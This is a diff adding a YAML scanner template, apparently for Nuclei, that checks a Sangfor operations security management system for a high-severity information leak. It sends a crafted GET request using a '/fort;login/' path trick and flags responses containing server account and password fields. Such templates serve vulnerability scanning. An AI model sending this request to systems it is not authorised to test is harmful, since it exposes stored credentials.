@@ -1,0 +1,26 @@
+id: SANGFOR-get_all_application_release-info
+
+info:
+  name: 深信服运维安全管理系统 get_all_application_release 敏感信息泄露漏洞
+  author: SANGFOR
+  severity: high
+  tags: SANGFOR
+
+http:
+  - raw:
+      - |+
+        GET /fort;login/app/get_all_application_release HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'fortApplicationReleaseServerAccount'
+          - 'fortApplicationReleaseServerPassword'
+        condition: and
